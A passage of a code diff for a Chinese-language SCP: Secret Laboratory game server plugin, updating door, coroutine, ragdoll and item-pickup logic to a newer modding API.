 				ev.Player.Broadcast(5, "----[<color=#32CD32>SCP247</color>]----\n<color=#FF0000>你碰到了随机门以被传送\n如果你被卡住 使用指令.tlkd </color>");
@@ -6801,10 +7050,17 @@ namespace YYYLike
 			{
 				ev.IsAllowed = true;
 			}
-			if ((ev.Door.DoorName == "NUKE_SURFACE" && ev.Player.CurrentItem.id == ItemType.KeycardNTFCommander) || ev.Player.CurrentItem.id == ItemType.KeycardChaosInsurgency)
-			{
-				ev.IsAllowed = true;
+            try
+            {
+				if ((ev.Door.GetComponent<DoorNametagExtension>().GetName == "SURFACE_NUKE" && ev.Player.CurrentItem.id == ItemType.KeycardNTFCommander) || ev.Player.CurrentItem.id == ItemType.KeycardChaosInsurgency)
+				{
+					ev.IsAllowed = true;
+				}
 			}
+            catch
+            {
+            }
+
 			if (bscp79 && ev.Player.Team == Team.SCP && new System.Random().Next(0, 100) >= 95)
 			{
 				ev.IsAllowed = true;
@@ -6815,7 +7071,7 @@ namespace YYYLike
 			}
 			if (scp682.Contains(ev.Player.UserId) && ev.Player.Role == RoleType.Scp93989 && new System.Random().Next(0, 100) >= 98)
 			{
-				ev.Door.DestroyDoor(b: true);
+				ev.Door.BreakDoor();
 				ev.IsAllowed = true;
 			}
 			if (ev.Player.Id == scp181id)
@@ -6826,35 +7082,25 @@ namespace YYYLike
 					ev.IsAllowed = true;
 				}
 			}
-			if (ev.Player.Id == cxkid)
+
+			if (ev.Player.Role == RoleType.FacilityGuard && ev.Door.name == "INTERCOM")
 			{
-				System.Random random3 = new System.Random();
-				if (random3.Next(1, 5) == 2)
-				{
-					ev.IsAllowed = false;
-					ev.Player.Broadcast(3, "你太菜了导致门没打开");
-				}
-				if (jntm)
-				{
-					ev.IsAllowed = true;
-					ev.Door.DestroyDoor(b: true);
-					ev.Player.ClearBroadcasts();
-					ev.Player.Broadcast(4, "你发动鸡你太美门都看不下去了");
-				}
-			}
-			if (ev.Player.Role == RoleType.FacilityGuard && ev.Door.DoorName == "INTERCOM")
-			{
-				ev.Door.DestroyDoor(b: true);
+				ev.Door.BreakDoor();
 				Exiled.API.Features.Map.Broadcast(5, "暴躁老哥" + ev.Player.Nickname + "一jio踹开了广播室");
 			}
-			if (ev.Player.Team == Team.MTF && ev.Door.DoorName == "INTERCOM")
-			{
-				ev.Door.DestroyDoor(b: true);
-				Exiled.API.Features.Map.Broadcast(5, "暴躁老哥" + ev.Player.Nickname + "一jio踹开了广播室");
+            try
+            {
+				if (ev.Player.Team == Team.MTF && ev.Door.GetComponent<DoorNametagExtension>().GetName == "INTERCOM")
+				{
+					ev.Door.BreakDoor();
+					Exiled.API.Features.Map.Broadcast(5, "暴躁老哥" + ev.Player.Nickname + "一jio踹开了广播室");
+				}
+			}
+            catch { 
 			}
 			if (Dio2.Contains(ev.Player.UserId) && sjtz1)
 			{
-				ev.Door.DestroyDoor(true);
+				ev.Door.BreakDoor();
 				ev.IsAllowed = true;
 			}
 			if (!Dio2.Contains(ev.Player.UserId) && sjtz1)
@@ -7189,7 +7435,10 @@ namespace YYYLike
 								}
 							}
 							ljfwj.Remove(ev.Player);
-							Timing.KillCoroutines(Coroutines3);
+							foreach (CoroutineHandle coroutineHandle in Coroutines3)
+							{
+								Timing.KillCoroutines(coroutineHandle);
+							}
 							Coroutines3.Clear();
 							Coroutines3.Add(Timing.RunCoroutine(SecondCounter3()));
 						}
@@ -7201,7 +7450,10 @@ namespace YYYLike
 						Coroutines.Add(Timing.RunCoroutine(Jzsjsx()));
 						jzsjuse = true;
 						Exiled.API.Features.Map.Broadcast(5, "「静止时计」效果时间停止5s");
-						Timing.KillCoroutines(Coroutines3);
+						foreach (CoroutineHandle coroutineHandle in Coroutines3)
+						{
+							Timing.KillCoroutines(coroutineHandle);
+						}
 						Coroutines3.Clear();
 						Coroutines3.Add(Timing.RunCoroutine(SecondCounter3()));
 					}
@@ -7262,7 +7514,7 @@ namespace YYYLike
 				if (scp2006id == ev.Player.Id && ev.Item.id == ItemType.Coin)
 				{
 					System.Random random = new System.Random();
-					Door door = Exiled.API.Features.Map.Doors[random.Next(Exiled.API.Features.Map.Doors.Count)];
+					DoorVariant door = Exiled.API.Features.Map.Doors[random.Next(Exiled.API.Features.Map.Doors.Count)];
 					ev.Player.Position = new Vector3(door.transform.position.x, door.transform.position.y + 1.5f, door.transform.position.z);
 					ev.Player.ClearBroadcasts();
 					ev.Player.Broadcast(5, "----[<color=#32CD32>SCP247</color>]----\n<color=#FF0000>你碰到了随机门以被传送\n如果你被卡住 使用指令.tlkd </color>");
@@ -7325,7 +7577,11 @@ namespace YYYLike
 
 						}
 					}
-					Timing.KillCoroutines(Coroutines3);
+					foreach (CoroutineHandle coroutineHandle in Coroutines3)
+					{
+						Timing.KillCoroutines(coroutineHandle);
+					}
+					
 					Coroutines3.Clear();
 					Coroutines3.Add(Timing.RunCoroutine(SecondCounter3()));
 					cd = new Thread(CD);
@@ -7347,8 +7603,32 @@ namespace YYYLike
 			cd.Abort();
 		}
 
+		public IEnumerator<float> SpawnRagdoll(Player player)
+		{
+			Role role = player.ReferenceHub.characterClassManager.Classes.SafeGet(0);
+			GameObject gameObject = UnityEngine.Object.Instantiate<GameObject>(role.model_ragdoll, player.Position, player.GameObject.transform.rotation);
+			NetworkServer.Spawn(gameObject);
+			var com = gameObject.GetComponent<Ragdoll>();
+			com.Networkowner = new Ragdoll.Info("BLA", "BLA", new PlayerStats.HitInfo(0f, "GAY", DamageTypes.Bleeding, player.Id), role, player.Id);
+			yield return Timing.WaitForSeconds(0.35f);
+			com.NetworkPlayerVelo = player.ReferenceHub.transform.forward * 10;
+
+		}
+
 		public void OnShoot(ShootingEventArgs ev)
 		{
+			if (ev.Shooter.Id == caidanqiangid)
+			{
+				caidanqiangid = 0;
+
+				ev.Shooter.GameObject.GetComponent<RagdollManager>().SpawnRagdoll(ev.Shooter.Position + Vector3.up * 5,
+Quaternion.identity, ev.Shooter.ReferenceHub.transform.forward * 10, (int)RoleType.Scp173,
+new PlayerStats.HitInfo(1000f, ev.Shooter.UserId, DamageTypes.Falldown,
+ev.Shooter.Id), false, "一只被服主搞碎的花生", "一只被服主搞碎的花生", 0);
+			}
+
+
+			/*Timing.RunCoroutine(SpawnRagdoll(ev.Shooter)); */
 			try
 			{
 				if (ev.Shooter.Id == scp3108playerid && ev.Shooter.CurrentItem.id == ItemType.GunCOM15)
@@ -7377,679 +7657,692 @@ namespace YYYLike
 
 		public void OnPickupItem(PickingUpItemEventArgs ev)
 		{
-			if(ev.Pickup.itemId == ItemType.Disarmer)
-			{
-				if(crowbaryes == false)
+			if(ev.Player.NoClipEnabled == false)
+            {
+				if (ev.Pickup == caidanqiang)
 				{
-					crowbaryes = true;
-					ev.Player.Broadcast(10, "<color=#00FFFF>------[撬棍]------</color>\n<color=#66FF00>你捡起了物理学圣剑——撬棍 在持有时\n有几率直接撬开一切的门</color>");
-					crowbarid = ev.Player.Id;
-				}
-			}
-			if(ev.Pickup == scp338)
-			{
-				ev.Player.Broadcast(10, "<color=#00FFFF>------[SCP338]------</color>\n<color=#66FF00>你捡起了SCP388 在持有时\n会随机刷新物资以及提示信息</color>");
-				Timing.KillCoroutines(Coroutines4);
-				Coroutines4.Clear();
-				scp338id = ev.Player.Id;
-				Coroutines4.Add(Timing.RunCoroutine(SCP338awa(ev.Player)));
-			}
-			if (ev.Player.Id == scp738id)
-			{
-				if(!scp738item.Contains(ev.Pickup.ItemId))
-				{
-					scp738item.Add(ev.Pickup.ItemId);
-					PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ev.Pickup.ItemId, 9999f, ev.Player.Position, Quaternion.identity, 0, 0, 0);
-				}
-			}
-			if(ev.Pickup == cjxb)
-			{
-				cjxbid = ev.Player.Id;
-				ev.Player.Broadcast(10, "<color=#00FFFF>------[超精血包]------</color>\n<color=#66FF00>使用后获得每1秒30HP的加血</color>");
-
-			}
-			if (ev.Pickup == bssy)
-			{
-				bssyid = ev.Player.Id;
-			}
-			if(ev.Pickup == scp1499)
-			{
-				scp1499pickupid = ev.Player.Id;
-				ev.Player.Broadcast(10,"<color=#00FFFF>------[SCP1499]------</color>\n<color=#66FF00>右键扔下后进入安全空间\n并且每秒扣除3HP</color>");
-			}
-			if (Baba.Contains(ev.Pickup))
-			{
-				Baba.Remove(ev.Pickup);
-				ev.IsAllowed = false;
-				ev.Pickup.Delete();
-				int time = new System.Random().Next(1, 100);
-				if (time >= 1 && time <= 5)
-				{
-					ev.Player.Broadcast(5, "一日三餐没烦恼，就吃老八秘制小汉堡，既实惠还管饱");
-					ev.Player.Health = ev.Player.MaxHealth;
-				}
-				if (time >= 6 && time <= 10)
-				{
-					ev.Player.Broadcast(5, "美食界里我老八，今天吃个哈密瓜，往里倒点臭卤虾，万人称我美食家");
-					ev.Player.AddItem(ItemType.GunLogicer);
-					ev.Player.AddItem(ItemType.MicroHID);
-				}
-				if (time >= 11 && time <= 23)
-				{
-					ev.Player.Broadcast(5, "都说面条吃不饱，就怪配料没放好，臭豆腐腐乳黄瓜丝，迟到嘴里美汁er汁er");
-					ev.Player.AddItem(ItemType.SCP207);
-					ev.Player.AddItem(ItemType.Adrenaline);
-					ev.Player.AdrenalineHealth = 30;
-				}
-				if (time >= 24 && time <= 38)
-				{
-					ev.Player.Broadcast(5, "腐乳豆腐拌香蕉，简简单单的夜宵，不管是香还是臭，到我嘴里都是肉");
-					ev.Player.AdrenalineHealth = 20;
-				}
-				if (time >= 39 && time <= 47)
-				{
-					ev.Player.Broadcast(5, "美食界里我老八，今天吃个大扒鸭，要问扒鸭哪里好，扒鸭屁股是块宝");
-					foreach (Player player in Player.List)
-					{
-						if (player.Role == RoleType.Scp173)
-						{
-							ev.Player.Position = player.Position;
-						}
-					}
-				}
-				if (time >= 48 && time <= 55)
-				{
-					ev.Player.Broadcast(5, "老铁们啊，尝不到苦辣，永远不知道酸甜，今天老八挑战一把酸甜苦辣咸，奥利给，干了兄弟们！");
-					foreach (Player player in Player.List)
-					{
-						if (player.Team == Team.SCP)
-						{
-							ev.Player.Position = player.Position;
-							break;
-						}
-					}
-				}
-				if (time >= 56 && time <= 74)
-				{
-					ev.Player.Broadcast(5, "不管是香还是臭，到我嘴里都是肉！");
-					ev.Player.Health += 30;
-					int awa = new System.Random().Next(1, 6);
-					switch (awa)
-					{
-						case 1:
-							ev.Player.AddItem(ItemType.Adrenaline);
-							break;
-						case 2:
-							ev.Player.AddItem(ItemType.GunCOM15);
-							break;
-						case 3:
-							ev.Player.AddItem(ItemType.GunE11SR);
-							break;
-						case 4:
-							ev.Player.AddItem(ItemType.GunLogicer);
-							break;
-						case 5:
-							ev.Player.AddItem(ItemType.KeycardFacilityManager);
-							break;
-					}
-				}
-				if (time >= 75 && time <= 85)
-				{
-					ev.Player.Broadcast(5, "俘虏！");
-					if (ev.Player.Team == Team.MTF)
-					{
-						ev.Player.Role = RoleType.ChaosInsurgency;
-					}
-					if (ev.Player.Team == Team.CHI)
-					{
-						ev.Player.Role = RoleType.NtfLieutenant;
-					}
-					if (ev.Player.Role == RoleType.ClassD)
-					{
-						ev.Player.Role = RoleType.NtfLieutenant;
-					}
-					if (ev.Player.Role == RoleType.Scientist)
-					{
-						ev.Player.Role = RoleType.ChaosInsurgency;
-					}
-				}
-				if (time >= 86 && time <= 100)
-				{
-					ev.Player.Broadcast(5, "美汁er汁er！");
-					ev.Player.Health = ev.Player.MaxHealth;
-					ev.Player.AddItem(ItemType.SCP207);
-					ev.Player.AddItem(ItemType.SCP018);
-					ev.Player.AddItem(ItemType.GunLogicer);
-					ev.Player.AddItem(ItemType.Adrenaline);
-					ev.Player.AddItem(ItemType.KeycardO5);
-				}
-			}
-			if (Baba1.Contains(ev.Pickup))
-			{
-				if (!第一次.Contains(ev.Player.Id))
-				{
-					第一次.Add(ev.Player.Id);
-					ev.Player.Broadcast(10, "老铁们啊，只有你们想不到的，没有老八做不到的。还是那句话，今天我老八挑战一把吃粑粑。兄弟们，奥利给！干了！");
-					Timing.RunCoroutine(HurtPepale(ev.Player, 80));
+					caidanqiang = null;
+					caidanqiangid = ev.Player.Id;
 
 				}
-				else if (第一次.Contains(ev.Player.Id) && !第二次.Contains(ev.Player.Id))
+				if (ev.Pickup.itemId == ItemType.Disarmer)
 				{
-					第二次.Add(ev.Player.Id);
-					ev.Player.Broadcast(10, "老铁们啊，虽然不是同一时间，但是同一个厕所。老八我再次挑战一把吃粑粑，奥利给！干了！兄弟们！");
-					Timing.RunCoroutine(HurtPepale(ev.Player, 99));
+					if (crowbaryes == false)
+					{
+						crowbaryes = true;
+						ev.Player.Broadcast(10, "<color=#00FFFF>------[撬棍]------</color>\n<color=#66FF00>你捡起了物理学圣剑——撬棍 在持有时\n有几率直接撬开一切的门</color>");
+						crowbarid = ev.Player.Id;
+					}
+				}
+				if (ev.Pickup == scp338)
+				{
+					ev.Player.Broadcast(10, "<color=#00FFFF>------[SCP338]------</color>\n<color=#66FF00>你捡起了SCP388 在持有时\n会随机刷新物资以及提示信息</color>");
+					foreach (CoroutineHandle coroutineHandle in Coroutines4)
+					{
+						Timing.KillCoroutines(coroutineHandle);
+					}
+					Coroutines4.Clear();
+					scp338id = ev.Player.Id;
+					Coroutines4.Add(Timing.RunCoroutine(SCP338awa(ev.Player)));
+				}
+				if (ev.Player.Id == scp738id)
+				{
+					if (!scp738item.Contains(ev.Pickup.ItemId))
+					{
+						scp738item.Add(ev.Pickup.ItemId);
+						PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ev.Pickup.ItemId, 9999f, ev.Player.Position, Quaternion.identity, 0, 0, 0);
+					}
+				}
+				if (ev.Pickup == cjxb)
+				{
+					cjxbid = ev.Player.Id;
+					ev.Player.Broadcast(10, "<color=#00FFFF>------[超精血包]------</color>\n<color=#66FF00>使用后获得每1秒30HP的加血</color>");
 
 				}
-				else if (第二次.Contains(ev.Player.Id))
+				if (ev.Pickup == bssy)
 				{
-					ev.Player.Broadcast(10, "老铁们啊，还是那句话，只有你们想不到的，没有老八做不到的。你们不要笑我狼狈不堪，我也可以笑你离开你的父母比我吃屎都难。奥利给！干了！兄弟们！");
-					Timing.RunCoroutine(HurtPepale(ev.Player, 999999));
-
+					bssyid = ev.Player.Id;
 				}
-				if (ev.Player.Health <= 0)
+				if (ev.Pickup == scp1499)
 				{
-					ev.Player.Kill();
-					ev.Player.Role = RoleType.Spectator;
-					Timing.RunCoroutine(DieNew(ev.Player.Id, ev.Player.UserId));
-
+					scp1499pickupid = ev.Player.Id;
+					ev.Player.Broadcast(10, "<color=#00FFFF>------[SCP1499]------</color>\n<color=#66FF00>右键扔下后进入安全空间\n并且每秒扣除3HP</color>");
 				}
-			}
-			try
-			{
-				if (ev.Player.Id == hdjjsid && ev.Pickup.ItemId == ItemType.GunE11SR)
+				if (Baba.Contains(ev.Pickup))
 				{
+					Baba.Remove(ev.Pickup);
 					ev.IsAllowed = false;
-				}
-				if (ylb2.Contains(ev.Player.UserId))
-				{
-					switch (ev.Pickup.ItemId)
+					ev.Pickup.Delete();
+					int time = new System.Random().Next(1, 100);
+					if (time >= 1 && time <= 5)
 					{
-						case ItemType.GrenadeFlash:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.Medkit);
-							break;
-						case ItemType.Radio:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.Medkit);
-							break;
-						case ItemType.WeaponManagerTablet:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.Medkit);
-							break;
-						default:
-							break;
+						ev.Player.Broadcast(5, "一日三餐没烦恼，就吃老八秘制小汉堡，既实惠还管饱");
+						ev.Player.Health = ev.Player.MaxHealth;
 					}
-				}
-				if (bpb2.Contains(ev.Player.Id))
-				{
-					switch (ev.Pickup.ItemId)
+					if (time >= 6 && time <= 10)
 					{
-						case ItemType.GrenadeFlash:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.GrenadeFrag);
-							break;
-						case ItemType.Radio:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.GrenadeFrag);
-							break;
-						case ItemType.WeaponManagerTablet:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.GrenadeFrag);
-							break;
-						default:
-							break;
+						ev.Player.Broadcast(5, "美食界里我老八，今天吃个哈密瓜，往里倒点臭卤虾，万人称我美食家");
+						ev.Player.AddItem(ItemType.GunLogicer);
+						ev.Player.AddItem(ItemType.MicroHID);
 					}
-				}
-				if (a127d && ev.Pickup.ItemId == ItemType.GunUSP && !scp3108pick)
-				{
-					scp3108playerid = ev.Player.Id;
-					scp3108pick = true;
-					Exiled.API.Features.Map.Broadcast(5, "<color=red>SCP-3108已被捡起被打中的人会强行转换身份</color>");
-					ev.Player.Broadcast(5, "<color=lime>你捡起了</color>\n[<color=red>SCP-3108</color>]\n<color=lime>使用本手枪射中人会让他角色变化 你只能开一枪</color>");
-				}
-				if (ev.Player.Id == scp914mid)
-				{
-					switch (new System.Random().Next(1, 4))
+					if (time >= 11 && time <= 23)
 					{
-						case 2:
-							switch (ev.Pickup.ItemId)
-							{
-								case ItemType.KeycardScientist:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardScientistMajor);
-									break;
-								case ItemType.KeycardJanitor:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardScientist);
-									break;
-								case ItemType.KeycardNTFLieutenant:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardNTFCommander);
-									break;
-								case ItemType.KeycardScientistMajor:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardContainmentEngineer);
-									break;
-								case ItemType.KeycardChaosInsurgency:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardO5);
-									break;
-								case ItemType.KeycardNTFCommander:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardO5);
-									break;
-								case ItemType.KeycardZoneManager:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardContainmentEngineer);
-									break;
-								case ItemType.KeycardContainmentEngineer:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardFacilityManager);
-									break;
-								case ItemType.KeycardFacilityManager:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardO5);
-									break;
-								case ItemType.GunCOM15:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunProject90);
-									break;
-								case ItemType.GunProject90:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunE11SR);
-									break;
-								case ItemType.GunE11SR:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunLogicer);
-									break;
-								case ItemType.GunLogicer:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.MicroHID);
-									break;
-								case ItemType.Flashlight:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GrenadeFlash);
-									break;
-								case ItemType.GrenadeFlash:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GrenadeFrag);
-									break;
-							}
-							break;
-						case 3:
-							switch (ev.Pickup.ItemId)
-							{
-								case ItemType.KeycardScientistMajor:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardScientist);
-									break;
-								case ItemType.KeycardScientist:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardJanitor);
-									break;
-								case ItemType.KeycardNTFCommander:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardNTFLieutenant);
-									break;
-								case ItemType.KeycardChaosInsurgency:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardChaosInsurgency);
-									break;
-								case ItemType.KeycardContainmentEngineer:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.KeycardZoneManager);
-									break;
-								case ItemType.GunProject90:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunCOM15);
-									break;
-								case ItemType.GunE11SR:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunProject90);
-									break;
-								case ItemType.GunLogicer:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunE11SR);
-									break;
-								case ItemType.MicroHID:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GunLogicer);
-									break;
-								case ItemType.GrenadeFlash:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.Flashlight);
-									break;
-								case ItemType.GrenadeFrag:
-									ev.IsAllowed = false;
-									ev.Pickup.Delete();
-									ev.Player.AddItem(ItemType.GrenadeFlash);
-									break;
-							}
-							break;
+						ev.Player.Broadcast(5, "都说面条吃不饱，就怪配料没放好，臭豆腐腐乳黄瓜丝，迟到嘴里美汁er汁er");
+						ev.Player.AddItem(ItemType.SCP207);
+						ev.Player.AddItem(ItemType.Adrenaline);
+						ev.Player.AdrenalineHealth = 30;
 					}
-				}
-				if (ev.Player.Id == scp181id)
-				{
-					int cardup = new System.Random().Next(1, 100);
-					switch (ev.Pickup.ItemId)
+					if (time >= 24 && time <= 38)
 					{
-						case ItemType.KeycardScientist:
-							if (cardup >= 80)
+						ev.Player.Broadcast(5, "腐乳豆腐拌香蕉，简简单单的夜宵，不管是香还是臭，到我嘴里都是肉");
+						ev.Player.AdrenalineHealth = 20;
+					}
+					if (time >= 39 && time <= 47)
+					{
+						ev.Player.Broadcast(5, "美食界里我老八，今天吃个大扒鸭，要问扒鸭哪里好，扒鸭屁股是块宝");
+						foreach (Player player in Player.List)
+						{
+							if (player.Role == RoleType.Scp173)
 							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardScientistMajor);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的科学家变成了大科学家卡</color>]");
+								ev.Player.Position = player.Position;
 							}
-							break;
-						case ItemType.KeycardJanitor:
-							if (cardup >= 80)
+						}
+					}
+					if (time >= 48 && time <= 55)
+					{
+						ev.Player.Broadcast(5, "老铁们啊，尝不到苦辣，永远不知道酸甜，今天老八挑战一把酸甜苦辣咸，奥利给，干了兄弟们！");
+						foreach (Player player in Player.List)
+						{
+							if (player.Team == Team.SCP)
 							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardScientist);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的清洁工变成了科学家卡</color>]");
+								ev.Player.Position = player.Position;
+								break;
 							}
-							break;
-						case ItemType.KeycardNTFLieutenant:
-							if (cardup >= 80)
-							{
-								ev.Player.AddItem(ItemType.KeycardNTFCommander);
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的士官卡变成了指挥官卡</color>]");
-							}
-							break;
-						case ItemType.KeycardScientistMajor:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardFacilityManager);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的大科学家变成了收容工程师卡</color>]");
-							}
-							break;
-						case ItemType.KeycardFacilityManager:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardNTFCommander);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的收容工程师卡变成了指挥官卡</color>]");
-							}
-							break;
-						case ItemType.KeycardNTFCommander:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardO5);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的指挥官卡变成了黑卡</color>]");
-							}
-							break;
-						case ItemType.KeycardContainmentEngineer:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardFacilityManager);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的区域总监卡变成了设施总监卡</color>]");
-							}
-							break;
-						case ItemType.KeycardSeniorGuard:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardNTFLieutenant);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的九尾狐新兵卡变成了九尾狐士官卡</color>]");
-							}
-							break;
-						case ItemType.KeycardGuard:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardSeniorGuard);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的保安卡变成了设施九尾狐新兵卡</color>]");
-							}
-							break;
-						case ItemType.KeycardChaosInsurgency:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.KeycardO5);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的混沌卡变成了设施黑卡</color>]");
-							}
-							break;
-						case ItemType.GunCOM15:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.GunProject90);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的小手枪变成了P90</color>]");
-							}
-							break;
-						case ItemType.GunProject90:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
+						}
+					}
+					if (time >= 56 && time <= 74)
+					{
+						ev.Player.Broadcast(5, "不管是香还是臭，到我嘴里都是肉！");
+						ev.Player.Health += 30;
+						int awa = new System.Random().Next(1, 6);
+						switch (awa)
+						{
+							case 1:
+								ev.Player.AddItem(ItemType.Adrenaline);
+								break;
+							case 2:
+								ev.Player.AddItem(ItemType.GunCOM15);
+								break;
+							case 3:
 								ev.Player.AddItem(ItemType.GunE11SR);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的P90变成了九尾步枪</color>]");
-							}
-							break;
-						case ItemType.GunE11SR:
-							if (cardup >= 80)
-							{
-								ev.IsAllowed = false;
-								ev.Pickup.Delete();
+								break;
+							case 4:
 								ev.Player.AddItem(ItemType.GunLogicer);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的九尾步枪变成了大菠萝</color>]");
-							}
-							break;
-						case ItemType.GunLogicer:
-							if (cardup >= 80)
-							{
+								break;
+							case 5:
+								ev.Player.AddItem(ItemType.KeycardFacilityManager);
+								break;
+						}
+					}
+					if (time >= 75 && time <= 85)
+					{
+						ev.Player.Broadcast(5, "俘虏！");
+						if (ev.Player.Team == Team.MTF)
+						{
+							ev.Player.Role = RoleType.ChaosInsurgency;
+						}
+						if (ev.Player.Team == Team.CHI)
+						{
+							ev.Player.Role = RoleType.NtfLieutenant;
+						}
+						if (ev.Player.Role == RoleType.ClassD)
+						{
+							ev.Player.Role = RoleType.NtfLieutenant;
+						}
+						if (ev.Player.Role == RoleType.Scientist)
+						{
+							ev.Player.Role = RoleType.ChaosInsurgency;
+						}
+					}
+					if (time >= 86 && time <= 100)
+					{
+						ev.Player.Broadcast(5, "美汁er汁er！");
+						ev.Player.Health = ev.Player.MaxHealth;
+						ev.Player.AddItem(ItemType.SCP207);
+						ev.Player.AddItem(ItemType.SCP018);
+						ev.Player.AddItem(ItemType.GunLogicer);
+						ev.Player.AddItem(ItemType.Adrenaline);
+						ev.Player.AddItem(ItemType.KeycardO5);
+					}
+				}
+				if (Baba1.Contains(ev.Pickup))
+				{
+					if (!第一次.Contains(ev.Player.Id))
+					{
+						第一次.Add(ev.Player.Id);
+						ev.Player.Broadcast(10, "老铁们啊，只有你们想不到的，没有老八做不到的。还是那句话，今天我老八挑战一把吃粑粑。兄弟们，奥利给！干了！");
+						Timing.RunCoroutine(HurtPepale(ev.Player, 80));
+
+					}
+					else if (第一次.Contains(ev.Player.Id) && !第二次.Contains(ev.Player.Id))
+					{
+						第二次.Add(ev.Player.Id);
+						ev.Player.Broadcast(10, "老铁们啊，虽然不是同一时间，但是同一个厕所。老八我再次挑战一把吃粑粑，奥利给！干了！兄弟们！");
+						Timing.RunCoroutine(HurtPepale(ev.Player, 99));
+
+					}
+					else if (第二次.Contains(ev.Player.Id))
+					{
+						ev.Player.Broadcast(10, "老铁们啊，还是那句话，只有你们想不到的，没有老八做不到的。你们不要笑我狼狈不堪，我也可以笑你离开你的父母比我吃屎都难。奥利给！干了！兄弟们！");
+						Timing.RunCoroutine(HurtPepale(ev.Player, 999999));
+
+					}
+					if (ev.Player.Health <= 0)
+					{
+						ev.Player.Kill();
+						ev.Player.Role = RoleType.Spectator;
+						Timing.RunCoroutine(DieNew(ev.Player.Id, ev.Player.UserId));
+
+					}
+				}
+				try
+				{
+					if (ev.Player.Id == hdjjsid && ev.Pickup.ItemId == ItemType.GunE11SR)
+					{
+						ev.IsAllowed = false;
+					}
